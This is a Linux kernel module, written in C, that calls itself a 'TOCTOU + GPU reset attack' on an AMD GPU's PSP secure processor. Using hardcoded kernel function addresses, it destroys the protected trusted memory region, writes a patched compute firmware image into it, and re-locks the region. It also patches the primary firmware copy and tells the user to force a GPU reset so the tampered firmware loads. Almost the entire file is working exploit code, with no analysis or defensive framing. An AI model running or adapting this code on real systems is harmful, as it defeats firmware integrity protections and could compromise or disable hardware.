#include <linux/module.h>
#include <linux/pci.h>
#include <linux/io.h>
#include <linux/delay.h>
#include <linux/slab.h>
MODULE_LICENSE("GPL");

struct psp_cmd { u32 buf_size, buf_version, cmd_id, r1,r2,r3,r4; u32 data[32]; u32 resp[16]; };
typedef int (*psp_fn)(void*, void*, struct psp_cmd*, u64);
typedef u32 (*rreg_fn)(void*, u32);

static int __init tr_init(void) {
    struct pci_dev *p = pci_get_device(0x1002,0x1586,NULL);
    void *a, *psp; psp_fn submit; rreg_fn rr;
    struct psp_cmd *cmd; u64 fence_mc; u32 gc = 0x2800;
    void *fw_buf = NULL; ssize_t fw_size; void __iomem *tmr_map;
    int ret;

    if (!p) return -ENODEV;
    a = (u8*)pci_get_drvdata(p) - 0x10;
    psp = (u8*)a + 0x3B910;
    fence_mc = *(u64*)((u8*)psp + 0x1B8);
    submit = (psp_fn)0xFFFFFFFFC1070840ULL;
    rr = (rreg_fn)0xFFFFFFFFC0F43460ULL;
    cmd = kzalloc(sizeof(*cmd), GFP_KERNEL);
    if (!cmd) { pci_dev_put(p); return -ENOMEM; }

    pr_info("tr: === TOCTOU + GPU RESET ATTACK ===\n");

    /* Load + patch firmware */
    { struct file *fp = filp_open("/tmp/gc_12_0_1_mec.bin", O_RDONLY, 0);
      if (IS_ERR(fp)) { pr_info("tr: no fw\n"); goto done; }
      fw_buf = kmalloc(0x6E000, GFP_KERNEL);
      if (!fw_buf) { filp_close(fp, NULL); goto done; }
      { loff_t pos = 0; fw_size = kernel_read(fp, fw_buf, 0x6E000, &pos); }
      filp_close(fp, NULL);
      /* Patch PC=0x800: NOP loop */
      { u32 *c = (u32*)((u8*)fw_buf + 0x4000);
        pr_info("tr: Orig [0x800]: %08X %08X %08X %08X\n", c[0],c[1],c[2],c[3]);
        c[0]=0x00000013; c[1]=0x00000013; c[2]=0x00000013; c[3]=0xFF5FF06F; }
    }

    /* Step 1: DESTROY_TMR */
    pr_info("tr: Step 1: DESTROY_TMR\n");
    memset(cmd,0,sizeof(*cmd)); cmd->buf_size=sizeof(*cmd); cmd->buf_version=1;
    cmd->cmd_id = 0x07;
    ret = submit(psp, NULL, cmd, fence_mc);
    pr_info("tr: DESTROY ret=%d\n", ret);

    /* Step 2: Write patched firmware to TMR phys */
    tmr_map = ioremap_wc(0x2060000000ULL, 0x100000);
    if (tmr_map) {
        u32 v = readl(tmr_map);
        pr_info("tr: TMR[0] = 0x%08X%s\n", v, v==0xFFFFFFFF?" locked":" writable");
        if (v != 0xFFFFFFFF) {
            u32 *src = (u32*)((u8*)fw_buf + 0x2000);
            int words = (fw_size - 0x2000) / 4;
            int i;
            for (i = 0; i < words && i < 0x40000; i++)
                writel(src[i], tmr_map + i * 4);
            wmb();
            pr_info("tr: Wrote %d words. TMR[0]=0x%08X TMR[0x800]=0x%08X\n",
                words, readl(tmr_map), readl(tmr_map+0x800*4));
        }
        iounmap(tmr_map);
    }

    /* Step 3: SETUP_TMR — re-lock with our firmware inside! */
    pr_info("tr: Step 3: SETUP_TMR\n");
    memset(cmd,0,sizeof(*cmd)); cmd->buf_size=sizeof(*cmd); cmd->buf_version=1;
    cmd->cmd_id = 0x05;
    cmd->data[0] = lower_32_bits(0x97E0000000ULL);
    cmd->data[1] = upper_32_bits(0x97E0000000ULL);
    cmd->data[2] = 0x08C00000; /* 140MB */
    ret = submit(psp, NULL, cmd, fence_mc);
    pr_info("tr: SETUP ret=%d\n", ret);

    /* Step 4: Also patch fw_pri (in case PSP re-reads it during reset) */
    {
        void *fw_pri = (void*)*(u64*)((u8*)psp + 0x058);
        u32 *c = (u32*)((u8*)fw_pri + 0x4000);
        c[0]=0x00000013; c[1]=0x00000013; c[2]=0x00000013; c[3]=0xFF5FF06F;
        pr_info("tr: fw_pri also patched\n");
    }

    /* Module stays loaded. User triggers GPU reset:
     * sudo cat /sys/kernel/debug/dri/0000:c3:00.0/amdgpu_gpu_recover
     * Then check: sudo insmod /tmp/psp2/mec_check2.ko */
    pr_info("tr: TMR contains patched FW. fw_pri patched.\n");
    pr_info("tr: NOW: sudo cat /sys/.../amdgpu_gpu_recover\n");

done:
    kfree(fw_buf); kfree(cmd); pci_dev_put(p);
    return 0;
}
static void __exit tr_exit(void) { pr_info("tr: unloaded\n"); }
module_init(tr_init); module_exit(tr_exit);
